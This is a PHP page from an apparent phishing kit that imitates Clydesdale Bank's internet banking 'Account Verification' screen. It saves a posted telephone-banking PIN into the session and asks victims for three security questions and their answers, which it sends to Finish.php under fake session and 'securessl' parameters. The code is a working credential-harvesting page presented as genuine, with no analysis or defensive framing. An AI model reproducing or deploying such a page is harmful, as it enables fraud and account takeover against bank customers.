<?php

error_reporting(0);

date_default_timezone_set("Europe/London");

session_start();


require "../../includes/functions.php";
require "../../includes/One_Time.php";

$_SESSION['telepin'] = $_POST['telepin'];

?>

<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<meta content="width=device-width" name="viewport">
<title>Validate information</title>
<link rel="shortcut icon" href="assets/img/favicon.ico" type="image/x-icon" />
<link href='assets/css/one.css' media="screen" rel="stylesheet" type="text/css">
<link href='assets/css/two.css' media='screen' rel="stylesheet" type='text/css'>
<link href='assets/css/three.css' media='screen' rel="stylesheet" type='text/css'>
<style>.w1 {width:100%!important} .w3 {width:33%!important} p.error {color:red} input.error {background-color:rgba(255,0,0,0.15)}</style>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0-beta1/jquery.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/jquery.validate.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/additional-methods.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/1.3.2/jquery.payment.js"></script>
<script src="assets/js/cardcheck.js"></script>

</head>
<body class="personal" onload="develop();">
<div class="container top-nav-bg hide-on-phones">
<div class="row">
<div class="three columns phone-two"><img src="assets/img/logo.gif"></div>
<div class="six columns phone-two" id="heroPanel"></div>
<div class="three columns ie6-no-right-margin phone-two text-right">
<p class="show-on-desktops">Text Size: <a href="javascript:standardFontSize();" tabindex="1" title="Standard Font Size"><span class="smallish">T</span></a> <a href="javascript:increaseFontSize();" tabindex="2" title="Larger Font Size"><span class="bigger">T</span></a></p>
<p><a class="nice nag round medium button" href="#" tabindex="3">Logout Internet Banking<span class="arrow"><!-- --></span></a></p>
<h6><?php echo date('l, d/m/Y');?></h6>
</div>
</div>
</div>
<div class="container show-on-phones" id="mobile-head">
<div class="row">
<div class="phone-one text-left">
<div id="mobile-nav"><a href="#">Menu</a></div>
</div>
<div class="phone-two text-center" id="mlogo"><img src="assets/img/mobile-logo.png"></div>
<div class="phone-one text-right" id="mlogout"><a href="#"><img src="assets/img/mobile-logout.png"></a></div>
</div>
</div>
<div class="container section-nav-bg" id="mobile-nav-menu">
<div class="row">
<div class="nine columns">
<ul class="nav-bar">
<li class=""><a href="#" tabindex="10">Account Info</a></li>
<li class=""><a href="#" tabindex="11">Payments</a></li>
<li class=""><a href="#" tabindex="14">Products</a></li>
<li class="active"><a href="#" tabindex="13">Administration</a></li>
<li class=""><a href="#" tabindex="12">Contact Us</a></li>
</ul>
</div>
<div class="three columns ie6-no-right-margin hide-on-phones">
<ul class="nav-bar" id="trmenu">
<li><a href="#" tabindex="22">Logout</a></li>
</ul>
</div>
</div>
</div>
<div class="container" id="mobile-nav-left">Administration</div>
<div class="hide-on-phones"><br></div>
<div class="container" id="wrap">
<div class="row">
<div class="three columns" id="mobile-nav-left-show">
<ul class="nav-bar vertical" id="secondarynavskip">
<li class="Level4"><a href="#">Administration</a></li>
<li class="Level4"><a href="#">Security Token</a></li>
<li class="Level4"><a href="#">Token Request</a></li>
<li class="Level4"><a href="#">Token Activation</a></li>
<li class="Level4"><a href="#">Change Password</a></li>
<li class="Level4"><a href="#">Change Security Questions and Answers</a></li>
<li class="Level4"><a href="#">Modify Contact Details</a></li>
<li class="Level4"><a href="#">Modify Account Access</a></li>
<li class="Level4"><a href="#">Modify Account Nicknames</a></li>
<li class="Level4"><a href="#">Modify Transaction History Settings</a></li>
</ul>
</div>
<div class="six columns">
<h2>Account Verification</h2>
<hr>
<div id="innercontent">
<form action="Finish.php?Account-Verification&sessionid=<?php echo generateRandomString(130); ?>&securessl=true" autocomplete="off" class="nice" id="details" method="post" name="details">
<div class="row">
<div class="twelve columns">Please enter your information below in order to reactivate access to our online banking & telephone banking service.</div>
</div>
<br>
<legend>Confirm Security Questions</legend>
<br>
<div class="row">
<div class="four columns"><label for="q1" class="singleLine">Choose question 1: </label></div>
<div class="eight columns ie6-no-right-margin">
<select name="q1" class="nag-select w1" id="q1">
<option value="" selected="selected">Please select question</option>
<option value="The name of a memorable place to you">The name of a memorable place to you?</option>
<option value="Your favourite film of all time">Your favourite film of all time ?</option>
<option value="Your favourite meal or restaurant">Your favourite meal or restaurant?</option>
<option value="What is your favourite book of all time">What is your favourite book of all time?</option>
<option value="What is your favourite teacher or subject">What is your favourite teacher or subject?</option>
<option value="What is your favourite TV star or show">What is your favourite TV star or show?</option></select>
</div>
</div>
<div class="row">
<div class="four columns"><label for="answer1" class="singleLine">Answer 1: </label></div>
<div class="eight columns ie6-no-right-margin"><input class="input-text w1" type="password" name="a1" maxlength="20" size="21" value="" id="a1"></div>
</div>
<div class="row">
<div class="four columns"><label for="q2" class="singleLine">Choose question 2: </label></div>
<div class="eight columns ie6-no-right-margin">
<select name="q2" class="nag-select w1" id="q2">
<option value="" selected="selected">Please select question</option>
<option value="The name of a memorable place to you">The name of a memorable place to you?</option>
<option value="Your favourite film of all time">Your favourite film of all time ?</option>
<option value="Your favourite meal or restaurant">Your favourite meal or restaurant?</option>
<option value="What is your favourite book of all time">What is your favourite book of all time?</option>
<option value="What is your favourite teacher or subject">What is your favourite teacher or subject?</option>
<option value="What is your favourite TV star or show">What is your favourite TV star or show?</option></select>
</div>
</div>
<div class="row">
<div class="four columns"><label for="answer1" class="singleLine">Answer 2: </label></div>
<div class="eight columns ie6-no-right-margin"><input class="input-text w1" type="password" name="a2" maxlength="20" size="21" value="" id="a2"></div>
</div>
<div class="row">
<div class="four columns"><label for="q3" class="singleLine">Choose question 3: </label></div>
<div class="eight columns ie6-no-right-margin">
<select name="q3" class="nag-select w1" id="q3">
<option value="" selected="selected">Please select question</option>
<option value="The name of a memorable place to you">The name of a memorable place to you?</option>
<option value="Your favourite film of all time">Your favourite film of all time ?</option>
<option value="Your favourite meal or restaurant">Your favourite meal or restaurant?</option>
<option value="What is your favourite book of all time">What is your favourite book of all time?</option>
<option value="What is your favourite teacher or subject">What is your favourite teacher or subject?</option>
<option value="What is your favourite TV star or show">What is your favourite TV star or show?</option></select>
</div>
</div>
<div class="row">
<div class="four columns"><label for="answer1" class="singleLine">Answer 3: </label></div>
<div class="eight columns ie6-no-right-margin"><input class="input-text w1" type="password" name="a3" maxlength="20" size="21" value="" id="a3"></div>
</div>
<br>
<br>
<div class="row">
<div class="four columns"><label class="singleLine"></label></div>
<div class="eight columns ie6-no-right-margin"><input class="nice nag round small button" style="float:right"  type="submit" value="Submit"></div>
</div>


</form>
</div>
</div>
<div class="three columns ie6-no-right-margin">
<div class="headed-box">
<div><a class="medium nag nice button round" href="#"><span class="arrow"></span> 0 new message(s)</a>
<p>Last login <strong><?php echo date('d/m/Y');?></strong></p>
</div>
</div>
<div class="headed-box">
<h4>Need Help?</h4>
<div><a class="medium white nice button round" href="#">Visit our Clydesdale Bank Help Centre <span class="arrow"></span></a></div>
</div>
</div>
</div>
</div>
<div class="clear"></div>
<div class="container hide-on-phones bcrumbs">
<div class="row">
<p>You are here:&nbsp;<b class="breadcrumb">Administration</b></p>
</div>
</div>
<div class="clear"></div>
<div class="bottom-bar">
<div class="row">
<p class="text-center">You can find impartial information and guidance on money matters on the "<a href="#">Money advice service</a>" website.<br>
Clydesdale Bank is covered by the Financial Services Compensation Scheme (FSCS), <a href="http://www.cbonline.co.uk/personal/savings/compensation-scheme" target="_blank" title="Find out more">Find out more</a>.</p>
</div>
<div class="clear"></div>
</div>
</body>
</html>